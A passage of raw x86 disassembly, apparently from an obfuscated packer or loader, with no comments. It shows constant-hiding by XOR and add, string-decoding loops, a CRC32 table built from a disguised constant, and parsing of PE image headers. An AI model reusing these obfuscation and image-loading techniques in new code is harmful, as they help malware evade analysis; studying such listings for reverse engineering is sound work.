  414b3c:	xor    eax,0x8a89
  414b41:	add    eax,0x3b4c
  414b46:	mov    WORD PTR [ecx],ax
  414b49:	add    ecx,0x2
  414b4c:	add    edx,0x2
  414b4f:	movzx  eax,WORD PTR [edx]
  414b52:	mov    ebx,0x4e3d
  414b57:	cmp    ax,bx
  414b5a:	jne    0x414b3c
  414b5c:	xor    eax,eax
  414b5e:	mov    WORD PTR [ecx],ax
  414b61:	mov    eax,DWORD PTR [edi+0x188]
  414b67:	pop    ebx
  414b68:	ret    
  414b69:	push   edi
  414b6a:	mov    edi,eax
  414b6c:	mov    eax,DWORD PTR [esi+0x188]
  414b72:	shl    edi,0x6
  414b75:	add    eax,edi
  414b77:	jmp    0x414b83
  414b79:	xor    cl,0x71
  414b7c:	sub    cl,0xb
  414b7f:	mov    BYTE PTR [eax],cl
  414b81:	inc    eax
  414b82:	inc    edx
  414b83:	mov    cl,BYTE PTR [edx]
  414b85:	cmp    cl,0x7a
  414b88:	jne    0x414b79
  414b8a:	mov    BYTE PTR [eax],0x0
  414b8d:	mov    eax,DWORD PTR [esi+0x188]
  414b93:	add    eax,edi
  414b95:	pop    edi
  414b96:	ret    
  414b97:	push   ebp
  414b98:	mov    ebp,esp
  414b9a:	sub    esp,0x38
  414b9d:	push   ebx
  414b9e:	mov    ebx,0xf89c85b5
  414ba3:	mov    DWORD PTR [ebp-0x4],ebx
  414ba6:	lea    eax,[ebx-0x3]
  414ba9:	push   esi
  414baa:	mov    DWORD PTR [ebp-0x24],eax
  414bad:	mov    ecx,DWORD PTR [ebp-0x4]
  414bb0:	mov    edx,DWORD PTR [ebp+0x8]
  414bb3:	mov    esi,0x7510896
  414bb8:	push   edi
  414bb9:	xor    ecx,esi
  414bbb:	mov    edi,0x3272dd
  414bc0:	add    ecx,edi
  414bc2:	cmp    edx,ecx
  414bc4:	je     0x414d32
  414bca:	mov    ecx,DWORD PTR [ebp-0x4]
  414bcd:	mov    edx,DWORD PTR [ebp+0xc]
  414bd0:	xor    ecx,esi
  414bd2:	add    ecx,edi
  414bd4:	cmp    edx,ecx
  414bd6:	je     0x414d32
  414bdc:	mov    ecx,DWORD PTR [ebp+0x10]
  414bdf:	mov    DWORD PTR [ebp-0x18],ecx
  414be2:	mov    ecx,DWORD PTR [ebp+0xc]
  414be5:	mov    DWORD PTR [ebp-0x14],ecx
  414be8:	mov    ecx,DWORD PTR [ebp+0x8]
  414beb:	mov    DWORD PTR [ebp-0x1c],0xf89c8508
  414bf2:	mov    DWORD PTR [ebp-0x20],eax
  414bf5:	mov    DWORD PTR [ebp-0x10],ebx
  414bf8:	mov    DWORD PTR [ebp+0xc],eax
  414bfb:	mov    DWORD PTR [ebp+0x10],0xf89c85b3
  414c02:	mov    eax,DWORD PTR [ebp+0xc]
  414c05:	mov    DWORD PTR [ebp-0xc],ecx
  414c08:	xor    eax,esi
  414c0a:	mov    ecx,0xffcd8d23
  414c0f:	sub    ecx,eax
  414c11:	add    ecx,DWORD PTR [ebp-0x14]
  414c14:	mov    DWORD PTR [ebp+0x8],ecx
  414c17:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  414c1e:	jmp    0x414d22
  414c23:	mov    eax,DWORD PTR [ebp+0xc]
  414c26:	mov    ecx,DWORD PTR [ebp+0xc]
  414c29:	xor    eax,esi
  414c2b:	xor    ecx,esi
  414c2d:	lea    ecx,[eax+ecx*1+0x64e5ba]
  414c34:	mov    eax,DWORD PTR [ebp+0x8]
  414c37:	xor    edx,edx
  414c39:	div    ecx
  414c3b:	mov    eax,DWORD PTR [ebp+0x10]
  414c3e:	mov    ecx,DWORD PTR [ebp+0xc]
  414c41:	xor    eax,esi
  414c43:	xor    ecx,esi
  414c45:	sub    eax,ecx
  414c47:	cmp    edx,eax
  414c49:	jne    0x414cde
  414c4f:	mov    eax,DWORD PTR [ebp+0x8]
  414c52:	add    eax,DWORD PTR [ebp-0xc]
  414c55:	mov    dl,BYTE PTR [eax]
  414c57:	mov    eax,DWORD PTR [ebp-0x10]
  414c5a:	mov    ecx,DWORD PTR [ebp-0x8]
  414c5d:	xor    eax,esi
  414c5f:	xor    ecx,esi
  414c61:	add    eax,edi
  414c63:	add    ecx,edi
  414c65:	cmp    eax,ecx
  414c67:	jae    0x414caf
  414c69:	lea    ecx,[eax-0x3272dd]
  414c6f:	mov    DWORD PTR [ebp-0x4],ecx
  414c72:	mov    ebx,DWORD PTR [ebp-0x4]
  414c75:	xor    ebx,esi
  414c77:	add    ebx,0x7f55d8f3
  414c7d:	lea    ecx,[ebp+eax*4-0x38]
  414c81:	mov    DWORD PTR [ecx],ebx
  414c83:	mov    ebx,DWORD PTR [ecx]
  414c85:	cmp    ebx,0x244ecbd0
  414c8b:	jbe    0x414c95
  414c8d:	add    DWORD PTR [ecx],0x405fc11
  414c93:	jmp    0x414c9b
  414c95:	add    DWORD PTR [ecx],0xfdaf43ef
  414c9b:	mov    ecx,DWORD PTR [ebp-0x8]
  414c9e:	xor    ecx,esi
  414ca0:	inc    eax
  414ca1:	inc    DWORD PTR [ebp-0x4]
  414ca4:	add    ecx,edi
  414ca6:	cmp    eax,ecx
  414ca8:	jb     0x414c72
  414caa:	mov    ebx,0xf89c85b5
  414caf:	mov    eax,DWORD PTR [ebp-0x18]
  414cb2:	test   eax,eax
  414cb4:	jne    0x414cbe
  414cb6:	xor    dl,0x71
  414cb9:	sub    dl,0xb
  414cbc:	jmp    0x414cd4
  414cbe:	mov    eax,DWORD PTR [ebp-0x1c]
  414cc1:	xor    al,0x96
  414cc3:	mov    cl,0x23
  414cc5:	sub    cl,al
  414cc7:	add    dl,cl
  414cc9:	mov    ecx,DWORD PTR [ebp-0x20]
  414ccc:	xor    cl,0x96
  414ccf:	sub    cl,0x23
  414cd2:	ror    dl,cl
  414cd4:	xor    eax,eax
  414cd6:	mov    eax,DWORD PTR [ebp+0x8]
  414cd9:	add    eax,DWORD PTR [ebp-0xc]
  414cdc:	mov    BYTE PTR [eax],dl
  414cde:	mov    eax,DWORD PTR [ebp+0x8]
  414ce1:	mov    ecx,DWORD PTR [ebp-0x10]
  414ce4:	sub    eax,edi
  414ce6:	xor    eax,esi
  414ce8:	cmp    eax,ecx
  414cea:	jne    0x414d10
  414cec:	mov    eax,DWORD PTR [ebp+0x10]
  414cef:	mov    ecx,DWORD PTR [ebp+0xc]
  414cf2:	xor    eax,esi
  414cf4:	xor    ecx,esi
  414cf6:	sub    eax,ecx
  414cf8:	sub    eax,edi
  414cfa:	xor    eax,esi
  414cfc:	mov    DWORD PTR [ebp+0x10],eax
  414cff:	mov    eax,DWORD PTR [ebp+0xc]
  414d02:	xor    eax,esi
  414d04:	mov    ecx,0xffcd8d23
  414d09:	sub    ecx,eax
  414d0b:	add    ecx,DWORD PTR [ebp-0x14]
  414d0e:	jmp    0x414d1f
  414d10:	mov    eax,DWORD PTR [ebp+0xc]
  414d13:	xor    eax,esi
  414d15:	mov    ecx,0xffcd8d23
  414d1a:	sub    ecx,eax
  414d1c:	add    ecx,DWORD PTR [ebp+0x8]
  414d1f:	mov    DWORD PTR [ebp+0x8],ecx
  414d22:	mov    eax,DWORD PTR [ebp+0x10]
  414d25:	cmp    eax,ebx
  414d27:	jne    0x414c23
  414d2d:	mov    eax,DWORD PTR [ebp-0x24]
  414d30:	jmp    0x414d35
  414d32:	mov    eax,DWORD PTR [ebp-0x4]
  414d35:	xor    eax,esi
  414d37:	add    eax,edi
  414d39:	pop    edi
  414d3a:	pop    esi
  414d3b:	pop    ebx
  414d3c:	leave  
  414d3d:	ret    0xc
  414d40:	push   ebp
  414d41:	mov    ebp,esp
  414d43:	sub    esp,0x14
  414d46:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  414d4d:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  414d54:	mov    eax,DWORD PTR [ebx]
  414d56:	mov    DWORD PTR [ebp-0x8],eax
  414d59:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  414d60:	push   esi
  414d61:	push   edi
  414d62:	mov    DWORD PTR [ebp-0x14],0xead718d5
  414d69:	mov    edi,DWORD PTR [ebp-0x4]
  414d6c:	mov    ecx,DWORD PTR [ebp-0x10]
  414d6f:	mov    eax,0x7510896
  414d74:	xor    edi,eax
  414d76:	mov    edx,0x3272dd
  414d7b:	xor    ecx,eax
  414d7d:	add    edi,edx
  414d7f:	add    ecx,edx
  414d81:	imul   edi,ecx
  414d84:	jmp    0x414dcc
  414d86:	mov    ecx,DWORD PTR [ebp-0x8]
  414d89:	mov    esi,DWORD PTR [ebp-0x4]
  414d8c:	xor    ecx,eax
  414d8e:	xor    esi,eax
  414d90:	add    ecx,edx
  414d92:	add    esi,edx
  414d94:	test   esi,ecx
  414d96:	mov    esi,DWORD PTR [ebp-0x8]
  414d99:	mov    ecx,DWORD PTR [ebp-0x4]
  414d9c:	je     0x414db3
  414d9e:	xor    ecx,eax
  414da0:	xor    esi,eax
  414da2:	add    ecx,edx
  414da4:	add    esi,edx
  414da6:	shr    esi,cl
  414da8:	mov    ecx,DWORD PTR [ebp-0x14]
  414dab:	xor    ecx,eax
  414dad:	add    ecx,edx
  414daf:	xor    esi,ecx
  414db1:	jmp    0x414dbd
  414db3:	xor    esi,eax
  414db5:	xor    ecx,eax
  414db7:	add    esi,edx
  414db9:	add    ecx,edx
  414dbb:	shr    esi,cl
  414dbd:	mov    DWORD PTR [ebp-0x8],esi
  414dc0:	mov    ecx,DWORD PTR [ebp-0x4]
  414dc3:	xor    ecx,eax
  414dc5:	lea    edi,[edi+ecx*1+0x3272dd]
  414dcc:	mov    ecx,DWORD PTR [ebp-0xc]
  414dcf:	mov    esi,DWORD PTR [ebp-0x4]
  414dd2:	xor    esi,eax
  414dd4:	xor    ecx,eax
  414dd6:	sub    ecx,esi
  414dd8:	cmp    edi,ecx
  414dda:	jbe    0x414d86
  414ddc:	mov    eax,DWORD PTR [ebp-0x8]
  414ddf:	pop    edi
  414de0:	mov    DWORD PTR [ebx],eax
  414de2:	mov    eax,DWORD PTR [ebp-0x8]
  414de5:	pop    esi
  414de6:	leave  
  414de7:	ret    
  414de8:	push   ebp
  414de9:	mov    ebp,esp
  414deb:	sub    esp,0x420
  414df1:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  414df8:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  414dff:	mov    DWORD PTR [ebp-0x18],0xf89c86b5
  414e06:	push   ebx
  414e07:	mov    DWORD PTR [ebp-0x1c],0xf89c85b4
  414e0e:	mov    eax,DWORD PTR [ebp-0x14]
  414e11:	push   esi
  414e12:	mov    esi,0x7510896
  414e17:	push   edi
  414e18:	xor    eax,esi
  414e1a:	mov    edi,0x3272dd
  414e1f:	add    eax,edi
  414e21:	mov    DWORD PTR [ebp-0x8],eax
  414e24:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  414e2b:	mov    DWORD PTR [ebp-0x4],0xead718d5
  414e32:	mov    DWORD PTR [ebp-0x10],0x8
  414e39:	mov    ecx,ecx
  414e3b:	mov    eax,DWORD PTR [ebp-0xc]
  414e3e:	mov    ecx,DWORD PTR [ebp-0x14]
  414e41:	xor    eax,esi
  414e43:	xor    ecx,esi
  414e45:	add    eax,edi
  414e47:	add    ecx,edi
  414e49:	imul   eax,ecx
  414e4c:	jmp    0x414e7f
  414e4e:	mov    eax,DWORD PTR [ebp-0x4]
  414e51:	sub    eax,edi
  414e53:	xor    eax,esi
  414e55:	mov    DWORD PTR [ebp-0x8],eax
  414e58:	lea    ebx,[ebp-0x8]
  414e5b:	call   0x414d40
  414e60:	mov    DWORD PTR [ebp-0x8],eax
  414e63:	mov    eax,DWORD PTR [ebp-0x8]
  414e66:	mov    ecx,DWORD PTR [ebp-0x4]
  414e69:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  414e70:	mov    eax,DWORD PTR [ebp-0xc]
  414e73:	mov    ecx,DWORD PTR [ebp-0x4]
  414e76:	xor    eax,esi
  414e78:	lea    eax,[eax+ecx*1+0x3272dd]
  414e7f:	mov    DWORD PTR [ebp-0x4],eax
  414e82:	mov    eax,DWORD PTR [ebp-0x18]
  414e85:	mov    ecx,DWORD PTR [ebp-0xc]
  414e88:	xor    ecx,esi
  414e8a:	xor    eax,esi
  414e8c:	sub    eax,ecx
  414e8e:	mov    ecx,DWORD PTR [ebp-0x4]
  414e91:	cmp    ecx,eax
  414e93:	jbe    0x414e4e
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	xor    eax,esi
  414e9a:	add    eax,edi
  414e9c:	mov    DWORD PTR [ebp-0x8],eax
  414e9f:	mov    DWORD PTR [ebp-0x18],0xf89c86b4
  414ea6:	mov    ebx,ebx
  414ea8:	jmp    0x414f0b
  414eaa:	mov    ecx,DWORD PTR [ebp-0x20]
  414ead:	mov    eax,DWORD PTR [ebp-0x8]
  414eb0:	xor    ecx,esi
  414eb2:	add    ecx,edi
  414eb4:	shr    eax,cl
  414eb6:	mov    DWORD PTR [ebp-0x4],eax
  414eb9:	mov    eax,DWORD PTR [ebp+0x8]
  414ebc:	mov    cl,BYTE PTR [eax]
  414ebe:	mov    BYTE PTR [ebp+0xb],cl
  414ec1:	mov    cl,BYTE PTR [ebp+0xb]
  414ec4:	mov    edx,DWORD PTR [ebp-0x8]
  414ec7:	movzx  ecx,cl
  414eca:	xor    ecx,edx
  414ecc:	mov    DWORD PTR [ebp+0x8],ecx
  414ecf:	mov    ecx,DWORD PTR [ebp-0x18]
  414ed2:	mov    edx,DWORD PTR [ebp+0x8]
  414ed5:	xor    ecx,esi
  414ed7:	add    ecx,edi
  414ed9:	and    ecx,edx
  414edb:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  414ee2:	mov    edx,DWORD PTR [ebp-0x4]
  414ee5:	xor    ecx,edx
  414ee7:	mov    DWORD PTR [ebp-0x8],ecx
  414eea:	mov    ecx,DWORD PTR [ebp-0xc]
  414eed:	xor    ecx,esi
  414eef:	lea    eax,[eax+ecx*1+0x3272dd]
  414ef6:	mov    DWORD PTR [ebp+0x8],eax
  414ef9:	mov    eax,DWORD PTR [ebp-0xc]
  414efc:	xor    eax,esi
  414efe:	mov    ecx,0xffcd8d23
  414f03:	sub    ecx,eax
  414f05:	add    ecx,DWORD PTR [ebp-0x10]
  414f08:	mov    DWORD PTR [ebp-0x10],ecx
  414f0b:	mov    eax,DWORD PTR [ebp-0x14]
  414f0e:	mov    ecx,DWORD PTR [ebp-0x10]
  414f11:	xor    eax,esi
  414f13:	add    eax,edi
  414f15:	cmp    ecx,eax
  414f17:	jne    0x414eaa
  414f19:	mov    eax,DWORD PTR [ebp-0x1c]
  414f1c:	mov    ecx,DWORD PTR [ebp-0x8]
  414f1f:	xor    eax,esi
  414f21:	add    eax,edi
  414f23:	pop    edi
  414f24:	pop    esi
  414f25:	xor    eax,ecx
  414f27:	pop    ebx
  414f28:	leave  
  414f29:	ret    0x4
  414f2c:	push   ebp
  414f2d:	mov    ebp,esp
  414f2f:	mov    eax,DWORD PTR [ebp+0x1c]
  414f32:	mov    ecx,DWORD PTR [ebp+0x8]
  414f35:	mov    edx,DWORD PTR [ebp+0x10]
  414f38:	mov    eax,DWORD PTR [eax+0x190]
  414f3e:	mov    eax,DWORD PTR [eax]
  414f40:	sub    esp,0x64
  414f43:	push   ebx
  414f44:	push   esi
  414f45:	push   edi
  414f46:	mov    edi,0x7510896
  414f4b:	xor    ecx,edi
  414f4d:	mov    ebx,0x3272dd
  414f52:	add    ecx,ebx
  414f54:	cmp    ecx,edx
  414f56:	jne    0x414f67
  414f58:	or     DWORD PTR ds:0x3750c3f,0x4263eb0c
  414f62:	jmp    0x415464
  414f67:	mov    ecx,DWORD PTR [ebp+0x8]
  414f6a:	mov    esi,DWORD PTR [ebp+0x14]
  414f6d:	mov    edx,DWORD PTR [esi]
  414f6f:	xor    ecx,edi
  414f71:	add    ecx,ebx
  414f73:	cmp    edx,ecx
  414f75:	je     0x41541f
  414f7b:	mov    ecx,DWORD PTR [ebp+0x1c]
  414f7e:	mov    DWORD PTR [ebp-0x1c],eax
  414f81:	mov    DWORD PTR [ebp+0x1c],ecx
  414f84:	mov    ecx,DWORD PTR [ebp+0x18]
  414f87:	mov    eax,DWORD PTR [esi]
  414f89:	mov    DWORD PTR [ebp-0x20],eax
  414f8c:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  414f93:	mov    edx,0xf89c85b2
  414f98:	mov    DWORD PTR [ebp-0x8],edx
  414f9b:	mov    eax,DWORD PTR [ebp+0x1c]
  414f9e:	mov    DWORD PTR [ebp+0x1c],eax
  414fa1:	mov    eax,DWORD PTR [ebp+0x1c]
  414fa4:	mov    eax,DWORD PTR [eax+0x190]
  414faa:	mov    eax,DWORD PTR [eax]
  414fac:	mov    DWORD PTR [ebp-0x24],ecx
  414faf:	mov    ecx,DWORD PTR [ebp+0x1c]
  414fb2:	mov    ecx,DWORD PTR [ecx+0x190]
  414fb8:	mov    ecx,DWORD PTR [ecx]
  414fba:	add    ecx,DWORD PTR [eax+0x3c]
  414fbd:	mov    DWORD PTR [ebp+0x10],ecx
  414fc0:	mov    eax,DWORD PTR [ebp+0x8]
  414fc3:	xor    eax,edi
  414fc5:	add    eax,ebx
  414fc7:	mov    DWORD PTR [ebp-0x4],eax
  414fca:	mov    eax,DWORD PTR [ebp+0x8]
  414fcd:	xor    eax,edi
  414fcf:	add    eax,ebx
  414fd1:	mov    DWORD PTR [ebp+0x18],eax
  414fd4:	mov    eax,DWORD PTR [ebp+0x10]
  414fd7:	mov    eax,DWORD PTR [eax+0x50]
  414fda:	sub    eax,0xc
  414fdd:	mov    DWORD PTR [ebp-0x28],eax
  414fe0:	mov    eax,DWORD PTR [ebp+0x10]
  414fe3:	mov    eax,DWORD PTR [eax+0x38]
  414fe6:	mov    ecx,DWORD PTR [ebp+0x10]
  414fe9:	dec    eax
  414fea:	test   DWORD PTR [ecx+0x54],eax
  414fed:	mov    eax,DWORD PTR [ebp+0x10]
  414ff0:	je     0x41500a
  414ff2:	mov    eax,DWORD PTR [eax+0x38]
  414ff5:	mov    ecx,DWORD PTR [ebp+0x10]
  414ff8:	mov    ecx,DWORD PTR [ecx+0x54]
  414ffb:	dec    eax
  414ffc:	not    eax
  414ffe:	and    ecx,eax
  415000:	mov    eax,DWORD PTR [ebp+0x10]
  415003:	mov    eax,DWORD PTR [eax+0x38]
  415006:	add    eax,ecx
  415008:	jmp    0x41500d
  41500a:	mov    eax,DWORD PTR [eax+0x54]
  41500d:	mov    DWORD PTR [ebp+0x1c],eax
  415010:	mov    eax,DWORD PTR [ebp+0x8]
  415013:	xor    eax,edi
  415015:	add    eax,ebx
  415017:	mov    DWORD PTR [ebp+0x18],eax
  41501a:	mov    eax,DWORD PTR [ebp+0x8]
  41501d:	xor    eax,edi
  41501f:	add    eax,ebx
  415021:	mov    DWORD PTR [ebp+0x18],eax
  415024:	mov    eax,DWORD PTR [ebp+0x8]
  415027:	mov    ecx,DWORD PTR [ebp-0x24]
  41502a:	xor    eax,edi
  41502c:	add    eax,ebx
  41502e:	mov    DWORD PTR [ecx],eax
  415030:	mov    DWORD PTR [ebp+0x18],edx
  415033:	mov    DWORD PTR [ebp+0x18],0xf89c85b3
  41503a:	mov    DWORD PTR [ebp+0x18],0xf89c85b0
  415041:	mov    DWORD PTR [ebp+0x18],0xf89c85b1
  415048:	mov    eax,DWORD PTR [ebp-0x8]
  41504b:	mov    ecx,DWORD PTR [ebp+0x1c]
  41504e:	xor    eax,edi
  415050:	add    eax,ebx
  415052:	imul   eax,ecx
  415055:	mov    ecx,DWORD PTR [ebp+0x8]
  415058:	mov    edx,DWORD PTR [ebp-0x28]
  41505b:	xor    ecx,edi
  41505d:	lea    ecx,[ecx+edx*1+0x3272dd]
  415064:	cmp    eax,ecx
  415066:	jae    0x415418
  41506c:	mov    eax,DWORD PTR [ebp+0x8]
  41506f:	xor    eax,edi
  415071:	add    eax,ebx
  415073:	mov    DWORD PTR [ebp+0x18],eax
  415076:	mov    eax,DWORD PTR [ebp+0x1c]
  415079:	add    eax,DWORD PTR [ebp-0x1c]
  41507c:	mov    DWORD PTR [ebp-0x4],eax
  41507f:	push   DWORD PTR [ebp-0x4]
  415082:	mov    esi,DWORD PTR [ebp-0x1c]
  415085:	mov    ecx,DWORD PTR [ebp+0x10]
  415088:	call   0x41416e
  41508d:	mov    DWORD PTR [ebp+0xc],eax
  415090:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  415097:	mov    eax,DWORD PTR [ebp-0x18]
  41509a:	xor    eax,edi
  41509c:	add    eax,ebx
  41509e:	push   eax
  41509f:	lea    eax,[ebp-0x40]
  4150a2:	push   eax
  4150a3:	call   0x414779
  4150a8:	mov    eax,DWORD PTR [ebp+0xc]
  4150ab:	test   eax,eax
  4150ad:	je     0x4150fd
  4150af:	mov    eax,DWORD PTR [ebp-0x18]
  4150b2:	xor    eax,edi
  4150b4:	add    eax,ebx
  4150b6:	push   eax
  4150b7:	push   DWORD PTR [ebp+0xc]
  4150ba:	lea    eax,[ebp-0x40]
  4150bd:	push   eax
  4150be:	call   0x414620
  4150c3:	mov    eax,DWORD PTR [ebp-0x4]
  4150c6:	mov    DWORD PTR [ebp-0x18],eax
  4150c9:	mov    eax,DWORD PTR [ebp-0x18]
  4150cc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4150cf:	sub    eax,ecx
  4150d1:	mov    DWORD PTR [ebp-0x18],eax
  4150d4:	mov    eax,DWORD PTR [ebp+0xc]
  4150d7:	mov    ecx,DWORD PTR [ebp+0xc]
  4150da:	mov    eax,DWORD PTR [eax+0x10]
  4150dd:	add    eax,DWORD PTR [ecx+0xc]
  4150e0:	mov    ecx,DWORD PTR [ebp-0x18]
  4150e3:	cmp    ecx,eax
  4150e5:	jb     0x4150fd
  4150e7:	mov    eax,DWORD PTR [ebp+0xc]
  4150ea:	mov    eax,DWORD PTR [eax+0xc]
  4150ed:	mov    ecx,DWORD PTR [ebp+0xc]
  4150f0:	add    eax,DWORD PTR [ecx+0x8]
  4150f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4150f6:	sub    eax,ecx
  4150f8:	jmp    0x4153eb
  4150fd:	push   0xc
  4150ff:	push   DWORD PTR [ebp-0x4]
  415102:	lea    eax,[ebp-0x4c]
  415105:	push   eax
  415106:	call   0x414620
  41510b:	mov    eax,0xf89c85b5
  415110:	mov    DWORD PTR [ebp-0x2c],eax
  415113:	mov    DWORD PTR [ebp-0x30],0xf89c85b2
  41511a:	mov    DWORD PTR [ebp-0x34],0xf89c85b3
  415121:	mov    DWORD PTR [ebp-0x38],0xf89c85b0
  415128:	lea    ecx,[ebp-0x2c]
  41512b:	mov    DWORD PTR [ebp-0xc],ecx
  41512e:	lea    ecx,[ebp-0x30]
  415131:	mov    DWORD PTR [ebp-0x10],ecx
  415134:	lea    ecx,[ebp-0x34]
  415137:	mov    DWORD PTR [ebp+0xc],ecx
  41513a:	lea    ecx,[ebp-0x38]
  41513d:	mov    DWORD PTR [ebp-0x14],ecx
  415140:	mov    ecx,DWORD PTR [ebp+0x8]
  415143:	xor    ecx,edi
  415145:	add    ecx,ebx
  415147:	mov    DWORD PTR [ebp-0x18],ecx
  41514a:	jmp    0x415346
  41514f:	cmp    eax,0xf89c85b3
  415154:	je     0x415358
  41515a:	mov    ecx,DWORD PTR [ebp-0x8]
  41515d:	xor    ecx,edi
  41515f:	mov    esi,eax
  415161:	add    ecx,ebx
  415163:	mov    DWORD PTR [ebp+0x18],ecx
  415166:	mov    eax,DWORD PTR [ebp-0x18]
  415169:	xor    esi,edi
  41516b:	lea    eax,[eax+esi*1+0x3272dd]
  415172:	mov    DWORD PTR [ebp-0x18],eax
  415175:	mov    eax,DWORD PTR [ebp-0x8]
  415178:	mov    ecx,DWORD PTR [ebp-0x18]
  41517b:	xor    eax,edi
  41517d:	add    eax,ebx
  41517f:	cmp    ecx,eax
  415181:	jne    0x415196
  415183:	mov    eax,DWORD PTR [ebp+0x8]
  415186:	xor    eax,edi
  415188:	add    eax,ebx
  41518a:	push   eax
  41518b:	push   0xc
  41518d:	lea    eax,[ebp-0x4c]
  415190:	push   eax
  415191:	call   0x414b97
  415196:	mov    eax,DWORD PTR [ebp-0xc]
  415199:	mov    eax,DWORD PTR [eax]
  41519b:	xor    eax,edi
  41519d:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4151a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4151a7:	xor    ecx,edi
  4151a9:	movzx  eax,al
  4151ac:	add    ecx,ebx
  4151ae:	cmp    eax,ecx
  4151b0:	je     0x41532e
  4151b6:	mov    eax,DWORD PTR [ebp-0x10]
  4151b9:	mov    eax,DWORD PTR [eax]
  4151bb:	xor    eax,edi
  4151bd:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4151c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4151c7:	xor    ecx,edi
  4151c9:	movzx  eax,al
  4151cc:	add    ecx,ebx
  4151ce:	cmp    eax,ecx
  4151d0:	je     0x41532e
  4151d6:	mov    eax,DWORD PTR [ebp+0xc]
  4151d9:	mov    eax,DWORD PTR [eax]
  4151db:	xor    eax,edi
  4151dd:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4151e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4151e7:	xor    ecx,edi
  4151e9:	movzx  eax,al
  4151ec:	add    ecx,ebx
  4151ee:	cmp    eax,ecx
  4151f0:	je     0x41532e
  4151f6:	mov    eax,DWORD PTR [ebp-0x14]
  4151f9:	mov    eax,DWORD PTR [eax]
  4151fb:	xor    eax,edi
  4151fd:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  415204:	mov    ecx,DWORD PTR [ebp+0x8]
  415207:	xor    ecx,edi
  415209:	movzx  eax,al
  41520c:	add    ecx,ebx
  41520e:	cmp    eax,ecx
  415210:	je     0x41532e
  415216:	mov    eax,DWORD PTR [ebp-0x10]
  415219:	mov    eax,DWORD PTR [eax]
  41521b:	xor    eax,edi
  41521d:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  415224:	mov    ecx,DWORD PTR [ebp-0xc]
  415227:	mov    ecx,DWORD PTR [ecx]
  415229:	xor    ecx,edi
  41522b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415232:	xor    al,cl
  415234:	mov    ecx,DWORD PTR [ebp+0xc]
  415237:	mov    ecx,DWORD PTR [ecx]
  415239:	xor    ecx,edi
  41523b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415242:	or     al,cl
  415244:	mov    ecx,DWORD PTR [ebp-0xc]
  415247:	mov    ecx,DWORD PTR [ecx]
  415249:	xor    ecx,edi
  41524b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  415252:	cmp    cl,al
  415254:	jne    0x41532e
  41525a:	mov    eax,DWORD PTR [ebp+0xc]
  41525d:	mov    eax,DWORD PTR [eax]
  41525f:	xor    eax,edi
  415261:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  415268:	mov    ecx,DWORD PTR [ebp-0x10]
  41526b:	mov    ecx,DWORD PTR [ecx]
  41526d:	xor    ecx,edi
  41526f:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415276:	xor    al,cl
  415278:	mov    ecx,DWORD PTR [ebp-0x14]
  41527b:	mov    ecx,DWORD PTR [ecx]
  41527d:	xor    ecx,edi
  41527f:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415286:	or     al,cl
  415288:	mov    ecx,DWORD PTR [ebp-0x10]
  41528b:	mov    ecx,DWORD PTR [ecx]
  41528d:	xor    ecx,edi
  41528f:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  415296:	cmp    cl,al
  415298:	jne    0x41532e
  41529e:	mov    eax,DWORD PTR [ebp-0x14]
  4152a1:	mov    eax,DWORD PTR [eax]
  4152a3:	xor    eax,edi
  4152a5:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4152ac:	mov    ecx,DWORD PTR [ebp+0xc]
  4152af:	mov    ecx,DWORD PTR [ecx]
  4152b1:	xor    ecx,edi
  4152b3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  4152ba:	xor    al,cl
  4152bc:	mov    ecx,DWORD PTR [ebp-0xc]
  4152bf:	mov    ecx,DWORD PTR [ecx]
  4152c1:	xor    ecx,edi
  4152c3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  4152ca:	or     al,cl
  4152cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4152cf:	mov    ecx,DWORD PTR [ecx]
  4152d1:	xor    ecx,edi
  4152d3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  4152da:	cmp    cl,al
  4152dc:	jne    0x41532e
  4152de:	mov    eax,DWORD PTR [ebp-0x14]
  4152e1:	mov    eax,DWORD PTR [eax]
  4152e3:	xor    eax,edi
  4152e5:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4152ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4152ef:	mov    ecx,DWORD PTR [ecx]
  4152f1:	xor    ecx,edi
  4152f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  4152fa:	xor    al,cl
  4152fc:	mov    ecx,DWORD PTR [ebp-0x10]
  4152ff:	mov    ecx,DWORD PTR [ecx]
  415301:	xor    ecx,edi
  415303:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  41530a:	or     al,cl
  41530c:	mov    ecx,DWORD PTR [ebp-0x14]
  41530f:	mov    ecx,DWORD PTR [ecx]
  415311:	xor    ecx,edi
  415313:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  41531a:	cmp    cl,al
